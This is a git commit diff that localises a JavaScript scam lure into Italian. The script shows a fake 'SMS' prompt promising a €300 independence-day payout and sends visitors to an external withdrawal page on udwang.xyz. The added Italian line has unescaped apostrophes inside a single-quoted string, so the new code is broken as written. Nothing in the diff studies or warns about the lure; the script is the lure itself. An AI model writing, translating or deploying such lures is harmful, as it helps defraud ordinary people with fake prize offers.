3d9ad37a794427e038f2d2d1a18ed3f8d4659c3e
bigetijazz32 <bigetijazz32@gmail.com>
2025-05-29 14:21:00 +0100

    Update italigrant.js

--- italigrant.js
+++ italigrant.js
@@ -1,7 +1,7 @@
 
 
-var password = 'Withdraw €300'
-password=prompt('SMS : Hello Dear, You are invited to claim €300 independence day offer . to Withdraw €300, press Ok to verify now','Withdraw €300');
-if (password != 'Withdraw €300') {
-location.href='https://www.udwang.xyz/withdraw-eur300';
+var password = 'Ritirare €300'
+password=prompt('SMS : Ciao caro, sei invitato a richiedere l'offerta di 300 € per il giorno dell'indipendenza. Per ritirare 300 €, premi Ok per verificare ora','Ritirare €300');
+if (password != 'Ritirare €300') {
+location.href='https://www.udwang.xyz/Ritirare-eur300';
 }
